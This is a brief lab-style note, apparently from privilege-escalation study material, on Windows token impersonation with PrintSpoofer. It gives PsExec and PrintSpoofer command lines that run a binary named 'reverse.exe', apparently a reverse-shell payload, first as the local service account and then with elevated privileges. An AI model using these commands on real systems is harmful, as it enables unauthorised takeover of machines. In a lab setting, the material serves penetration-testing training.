### Token Impersonation - PrintSpoofer

1. **Simulate Service Account Shell:**
   - Start a command prompt as admin:
     ```plaintext
     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
     ```

2. **Run PrintSpoofer Exploit:**
   ```plaintext
   C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
   ```
